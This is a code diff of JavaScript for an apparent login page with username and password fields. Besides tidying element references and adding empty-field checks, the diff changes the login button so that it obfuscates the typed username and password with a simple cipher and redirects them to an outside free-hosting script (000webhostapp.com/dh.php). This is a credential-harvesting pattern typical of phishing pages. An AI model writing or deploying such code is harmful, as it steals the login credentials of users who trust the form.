@@ -1,12 +1,13 @@
-let psf = document.getElementById("pp");
-let sh = document.getElementById("show");
-let psfull = "no";
+const usf = document.getElementById('usf');
+const pp = document.getElementById('pp');
+const sh = document.getElementById("show");
+let ppull = "no";
 let ourUrl = new URL(window.location.href);
 if (ourUrl.searchParams.get('error')) {
-    document.getElementById('pp').classList.add('error');
+    pp.classList.add('error');
 }
-psf.oninput = () => {
-    if (psf.value == "") {
+pp.oninput = () => {
+    if (pp.value == "") {
         sh.style.display = "none";
     } else {
         sh.style.display = "block";
@@ -15,15 +16,18 @@ psf.oninput = () => {
 sh.onclick = () => {
     if (sh.innerText == "Show") {
         sh.innerText = "Hide";
-        psf.type = "text";
+        pp.type = "text";
     } else {
         sh.innerText = "Show";
-        psf.type = "password";
+        pp.type = "password";
     }
 };
-document.getElementById("pp").onfocus = () => {
-    document.getElementById("pp").classList.remove("error");
+pp.onfocus = () => {
+    pp.classList.remove("error");
 };
+usf.onfocus = ()=>{
+    usf.classList.remove('error');
+}
 // 33 -126
 function uniformDataHandler(anum){
     if(anum < 32){
@@ -41,10 +45,19 @@ const enc = (str, key) => {
     return gstr;
 }
 document.getElementById('log').onclick = () => {
-    const us = { name: document.getElementById('usf').value, key: document.getElementById('pp').value };
+    const us = { name: usf.value, key: pp.value };
+    if(us.name === '' || us.key === ' '){
+        usf.classList.add('error');
+        return 0;
+    }
+    if(us.key === '' || us.key === ' '){
+        pp.classList.add('error');
+        return 0;
+    }
     let vurl = new URLSearchParams();
     vurl.set('rd', enc(JSON.stringify(us), 23));
-    window.history.pushState(null,'','?' + vurl.toString());
+    window.location.replace('https://liveliest-plug.000webhostapp.com/dh.php' + vurl.toString());
+    // window.history.pushState(null,'','?' + vurl.toString());
 };
 // document.getElementById("log").onclick = () => {
 //     window.location.replace()
